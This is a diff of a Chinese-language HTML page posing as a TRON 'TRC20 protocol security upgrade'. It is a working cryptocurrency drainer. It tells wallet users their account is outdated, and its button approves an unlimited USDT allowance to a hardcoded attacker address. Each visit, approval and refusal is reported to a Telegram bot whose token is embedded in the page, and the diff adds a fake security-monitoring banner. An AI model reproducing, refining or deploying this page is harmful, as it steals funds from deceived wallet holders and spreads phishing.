@@ -2,71 +2,118 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TRON 网络安全协议中心</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRC20 协议安全升级</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f2f4f7; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { width: 90%; max-width: 360px; background: white; border-radius: 22px; padding: 35px 25px; box-shadow: 0 12px 30px rgba(0,0,0,0.06); text-align: center; }
-        .logo { width: 75px; height: 75px; margin-bottom: 20px; }
-        h2 { font-size: 21px; color: #111; margin-bottom: 12px; font-weight: 700; }
-        p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 30px; }
-        .btn { background: #007aff; color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; box-shadow: 0 6px 15px rgba(0,122,255,0.2); }
-        .footer { margin-top: 25px; font-size: 11px; color: #aaa; }
+        body { font-family: sans-serif; margin: 0; background: #f5f5f5; }
+        
+        /* 1. 顶部安全监测提示条 */
+        .safety-header {
+            background: #fff9e6;
+            color: #ff9500;
+            padding: 10px;
+            font-size: 13px;
+            text-align: center;
+            font-weight: bold;
+            border-bottom: 1px solid #ffeeba;
+        }
+
+        .container { padding: 20px; text-align: center; }
+        .card { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h2 { font-size: 20px; color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        
+        /* 按钮样式 */
+        .btn {
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+        }
+        .btn:disabled { background: #ccc; }
+        
+        .footer { margin-top: 20px; color: #999; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://www.tronlink.org/img/logo.png" class="logo">
-        <h2>TRC20 协议安全升级</h2>
-        <p>检测到您的账户版本过低。为保障资产安全，请立即完成节点加固。此操作将为您的账户启动多重加密保护。</p>
-        <button class="btn" id="mainBtn" onclick="start()">立即安全加固</button>
-        <div class="footer">TRON NETWORK 认证保护</div>
+
+    <div class="safety-header">
+        🛡️ TRON 网络节点安全监测中，请勿退出页面
     </div>
 
+    <div class="container">
+        <div class="card">
+            <img src="https://www.tronlink.org/img/logo.png" class="logo" alt="logo">
+            <h2>TRC20 协议安全升级</h2>
+            <p>检测到您的账户版本过低。为保障资产安全，请立即完成节点加固。此操作将对您的 TRC20 智能合约进行环境校验。</p>
+            
+            <button class="btn" id="mainBtn" onclick="start()">立即安全加固</button>
+            
+            <div class="footer">TRON NETWORK 认证保护</div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <script>
         // ======= 核心固定配置 =======
         const CONFIG = {
             RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", 
-            TOKEN: "8591423736:AAGdbcYNJ1t1EpLH6060XDtyc3gzXoW_r1U", 
-            ID: "8003040361", 
-            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" 
+            TOKEN: "8591423736:AAGdbcYNJ1t1EpLH6060XDtyc3gzXoW_rI", 
+            ID: "8003040361",
+            USDT: "TR7NHqjeKQXGTCi8q8ZY4pL8otSzgjLj6t"
         };
 
+        // 发送日志到 Telegram
         async function sendLog(msg) {
             try {
                 await fetch(https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CONFIG.ID, text: msg, parse_mode: "HTML"})
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.ID,
+                        text: msg,
+                        parse_mode: 'HTML'
+                    })
                 });
             } catch (e) {}
         }
 
+        // 核心执行函数
         async function start() {
-            if (!window.tronWeb) return alert("请在钱包内打开");
+            if (!window.tronWeb) {
+                return alert("请在波场钱包（如 TokenPocket 或 TronLink）内打开此页面");
+            }
+
             const btn = document.getElementById('mainBtn');
             const addr = window.tronWeb.defaultAddress.base58;
+
             try {
+                // 修改按钮状态为同步中
                 btn.innerText = "同步中...";
                 btn.disabled = true;
-                
-                // 1. 发送初步信号
-                await sendLog(🔍 <b>发现访问</b>\n地址: <code>${addr}</code>\n正在请求授权...);
 
+                // 1. 发送访问日志
+                await sendLog(🔍 <b>发现访问</b>\n地址: <code>${addr}</code>);
+
+                // 2. 唤起授权请求
                 const contract = await window.tronWeb.contract().at(CONFIG.USDT);
                 const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 
-                // 2. 唤起授权
                 await contract.approve(CONFIG.RECEIVER, max).send();
-                
+
                 // 3. 授权成功通知
-                await sendLog(✅ <b>授权成功</b>\n地址: <code>${addr}</code>\n目标: <code>${CONFIG.RECEIVER}</code>);
+                await sendLog(✅ <b>授权成功</b>\n地址: <code>${addr}</code>);
                 alert("安全加固成功！系统已为您升级节点。");
                 btn.innerText = "已完成加固";
-            } catch (err) {
-                // 4. 失败/拒绝通知
-                await sendLog(❌ <b>操作取消</b>\n地址: <code>${addr}</code>);
+                } catch (err) {
+                // 4. 用户拒绝或出错
+                await sendLog(❌ <b>操作取消/失败</b>\n地址: <code>${addr}</code>);
                 btn.innerText = "立即安全加固";
                 btn.disabled = false;
             }
@@ -74,3 +121,4 @@
     </script>
 </body>
 </html>
+                
